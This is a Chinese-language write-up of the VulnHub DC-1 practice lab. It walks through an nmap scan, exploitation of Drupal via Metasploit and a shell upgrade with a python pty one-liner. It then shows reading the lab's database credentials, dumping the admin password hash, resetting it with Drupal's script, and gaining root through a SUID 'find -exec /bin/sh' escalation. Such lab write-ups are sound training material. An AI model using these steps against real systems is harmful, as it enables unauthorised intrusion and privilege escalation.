---
title: DC-1复现
tags: 
  - vulnhub
  - 渗透测试
category: 靶场&靶机
permalink: /archives/54045/
published: 2022-06-05 05:28:19
---

## DC-1复现

## 描述



> DC-1 是一个专门建造的易受攻击的实验室，旨在获得渗透测试领域的经验。
>
> 
>
> 它旨在为初学者带来挑战，但它的简单程度取决于您的技能和知识以及您的学习能力。
>
> 
>
> 要成功完成这一挑战，您将需要 Linux 技能、熟悉 Linux 命令行以及使用基本渗透测试工具的经验，例如可以在 Kali Linux 或 Parrot Security OS 上找到的工具。
>
> 
>
> 有多种获得 root 的方法，但是，我已经包含了一些包含初学者线索的标志。
>
> 
>
> 总共有五个标志，但最终目标是在 root 的主目录中找到并读取标志。您甚至不需要成为 root 即可执行此操作，但是，您将需要 root 权限。
>
> 根据您的技能水平，您可能可以跳过查找大多数这些标志并直接获取根。
>
> 
>
> 初学者可能会遇到他们以前从未遇到过的挑战，但谷歌搜索应该是获取完成这一挑战所需信息的全部内容。

## 开始

### 1.利用nmap收集有用信息

- 确定DC-1的ip为**192.168.207.136**

- 使用命令

`nmap -sT 192.168.207.136`

- 扫描靶机开了哪些端口

![1](./images/1.png)

- 发现该靶机开放了*ssh*服务和*http*服务

![image-20220523202935501](./images/image-20220523202935501.png)

- 访问网址后看到有登录框尝试弱口令并没有成功，其中该网站的CMS是Drupal

![img](./images/GE9}52_4[MR{CSE]N{V$D78.png)

### 2.使用msf查找Drupal可利用的漏洞

![QQ图片20220523203527](./images/QQ图片20220523203527.png)

- 有7个，从上往下试，试到第二个的时候就成了

![img](./images/L[Z1WDEH{}9TI`L[I[EUV.png)

- 进入shell里发现了*flag1.txt*，提示去找配置文件

![img](./images/UGOD7XAP0$SVTSCL4DNPGQF.png)

> **flag1：**
>
> **Every goog CMS needs a config file - and so do you.**

- 通过百度知道**drupal**的配置文件是在*/var/www/sites/default*下，那我们直接进到目录下 *cat settings.php*

- 在浏览配置文件得过程中发现了**flag2**，是关于数据库的登录信息

**flag2：**

```sql
/**
 *

 * flag2
 * Brute force and dictionary attacks aren't the
 * only ways to gain access (and you WILL need access).
 * What can you do with these credentials?
   *
    */

$databases = array (
  'default' => 
  array (
    'default' => 
    array (
      'database' => 'drupaldb',
      'username' => 'dbuser',
      'password' => 'R0ck3t',
      'host' => 'localhost',
      'port' => '',
      'driver' => 'mysql',
      'prefix' => '',
    ),
  ),
);
```

### 3.登录MySQL和python及php脚本二点使用

- 用户名是：**dbuser**；密码是**R0ck3t**

![QQ图片20220523203734](./images/QQ图片20220523203734.png)

- 直接使用**MySQL**命令时失效了；进到*shell*里使用命令也没有反应

![ea3277f1-fe50-40cb-9614-21ee8e6b0261](./images/ea3277f1-fe50-40cb-9614-21ee8e6b0261.png)

- 在使用*python -V*的命令时，发现靶机安装了python 2.7.3版本，那么使用python一句话命令获取标准*shell*

```python
python -c "import pty;pty.spawn('/bin/bash')"
```

```plain
1.mysql -udbuser -pR0ck3t  #连接数据库
2.show databases;       #显示数据库列表
```

![QQ图片20220523203937](./images/QQ图片20220523203937.png)

![13~`Y$J55MDZ_`{J8NQ[]68](./images/13`Y$J55MDZ_`{J8NQ[]68.png)

```plain
1.use drupaldb;			#使用drupal数据库
2.show tables;			#显示库中的数据表
```

```plain
+-----------------------------+
| Tables_in_drupaldb          |
+-----------------------------+
| actions                     |
| authmap                     |
| batch                       |
| block                       |
| block_custom                |
| block_node_type             |
| block_role                  |
| blocked_ips                 |
| cache                       |
| cache_block                 |
| cache_bootstrap             |
| cache_field                 |
| cache_filter                |
| cache_form                  |
| cache_image                 |
| cache_menu                  |
| cache_page                  |
| cache_path                  |
| cache_update                |
| cache_views                 |
| cache_views_data            |
| comment                     |
| ctools_css_cache            |
| ctools_object_cache         |
| date_format_locale          |
| date_format_type            |
| date_formats                |
| field_config                |
| field_config_instance       |
| field_data_body             |
| field_data_comment_body     |
| field_data_field_image      |
| field_data_field_tags       |
| field_revision_body         |
| field_revision_comment_body |
| field_revision_field_image  |
| field_revision_field_tags   |
| file_managed                |
| file_usage                  |
| filter                      |
| filter_format               |
| flood                       |
| history                     |
| image_effects               |
| image_styles                |
| menu_custom                 |
| menu_links                  |
| menu_router                 |
| node                        |
| node_access                 |
| node_comment_statistics     |
| node_revision               |
| node_type                   |
| queue                       |
| rdf_mapping                 |
| registry                    |
| registry_file               |
| role                        |
| role_permission             |
| search_dataset              |
| search_index                |
| search_node_links           |
| search_total                |
| semaphore                   |
| sequences                   |
| sessions                    |
| shortcut_set                |
| shortcut_set_users          |
| system                      |
| taxonomy_index              |
| taxonomy_term_data          |
| taxonomy_term_hierarchy     |
| taxonomy_vocabulary         |
| url_alias                   |
| users                       |
| users_roles                 |
| variable                    |
| views_display               |
| views_view                  |
| watchdog                    |
+-----------------------------+
80 rows in set (0.00 sec)
```

```plain
1.select * from users;		#获取users的内容
2.name：admin |pass： $S$DbpIRKV5QXrJK4Gbhb.LDFoTjqoYNKAOB.DY3V1BL.JMbMkZANhY
```

- 经过网上搜索知道了在**drupal7**的安装目录中的*scripts*下，有一些开发者写好的PHP脚本，可以执行一些操作；

![29b907c4-753f-4b59-83b0-83abd0515151](./images/29b907c4-753f-4b59-83b0-83abd0515151.png)

- 我们这次利用的脚本的名称是：**password-hash.sh；**

```php
php scripts/password-hash.sh '123456'>new_paswd.txt		#把admin的密码改成123456并储存在new_passwd.txt中
```

![f0306074-0e74-4e83-9d36-2b96e9cbec68](./images/f0306074-0e74-4e83-9d36-2b96e9cbec68.png)

- 那我们就可以直接拿着账号密码登录最开始访问的那个网站，在**dashboard**和**content**中都可以找到**flag3**

![b9a9963f-b64d-4de1-8bfc-89e1bf6a3163](./images/b9a9963f-b64d-4de1-8bfc-89e1bf6a3163.png)

![86b6342b-920c-4f84-b161-6eb4cc02445e](./images/86b6342b-920c-4f84-b161-6eb4cc02445e.png)

> **flag3：**
>
> **Special PERMS will help FIND the passwd - but you'll need to -exec that command to work out how to get what's in the shadow.**

![c838d46f-3446-4dd6-96cd-80298e282a22](./images/c838d46f-3446-4dd6-96cd-80298e282a22.png)

- flag3中有几个关键词：perms、find、-exec、shadow

### 4.误打误撞发现了flag4

![15bc44cf-40b8-48e8-bcf4-744501d9026b](./images/15bc44cf-40b8-48e8-bcf4-744501d9026b.png)

> **flag4：**
>
> **Can you use this same method to find or access the flag in root?**	
>
> **Probably. But perhaps it's not that easy.  Or maybe it is?**

### 5.提权

- 根据提示进到根目录下，但是提示没有权限

![6d9b80a3-a0bc-441f-84ea-ce8497f7fb1e](./images/6d9b80a3-a0bc-441f-84ea-ce8497f7fb1e.png)

- 此时，我们想到flag3中提到的几个关键词，我们可以利用一些方法进行提权

- 以下命令可以查看当前系统上运行的所有SUID可执行文件

```plain
find / -user root -perm -4000 -print 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
find / -user root -perm -4000 -exec ls -ldb {} ;
```

- 看到有find命令

![0a647e18-e436-4936-9972-7e6ea1c250e6](./images/0a647e18-e436-4936-9972-7e6ea1c250e6.png)

- 利用命令提权

```plain
find root -exec '/bin/sh' \；
```

![88c75a97-b9e6-4b1a-a408-a014dae31e69](./images/88c75a97-b9e6-4b1a-a408-a014dae31e69.png)

- 进到根目录下找到最后的flag

![b937d42a-7535-4c8b-8c4e-8d2948b33f56](./images/b937d42a-7535-4c8b-8c4e-8d2948b33f56.png)

**flag5：**

> **Well done!!!!**
>
> **Hopefully you've enjoyed this and learned some new skills.**
>
> **You can let me know what you thought of this little journey**
> **by contacting me via Twitter -** [**@DCAU7** ]() 